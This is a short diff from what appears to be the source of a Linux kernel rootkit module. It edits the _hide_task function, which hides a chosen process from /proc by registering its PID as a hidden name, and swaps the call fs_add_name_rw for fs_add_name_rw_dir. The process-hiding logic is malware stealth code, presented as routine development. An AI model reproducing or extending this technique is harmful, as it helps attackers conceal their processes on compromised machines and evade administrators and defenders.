@@ -43,7 +43,6 @@ static struct task_struct *_check_hide_by_pid(pid_t pid)
  */
 static int _hide_task(void *data) {
     char pidnum[32] = {0};
-    const char *pidstr[] = {NULL,NULL};
     struct hidden_tasks *ht;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
     struct hlist_node *link;
@@ -79,11 +78,10 @@ static int _hide_task(void *data) {
 
     /** hide /proc/<pid> */
     snprintf(pidnum, sizeof(pidnum), "%d",  node->task->pid);
-    pidstr[0] = pidnum;
 
     prinfo("hide [%p] %s : %d\n", ht->task, ht->task->comm, ht->task->pid);
 
-    fs_add_name_rw(pidstr, 0);
+    fs_add_name_rw_dir(pidnum, 0, 0 /**XXX*/, true);
 
 
     /** debug */
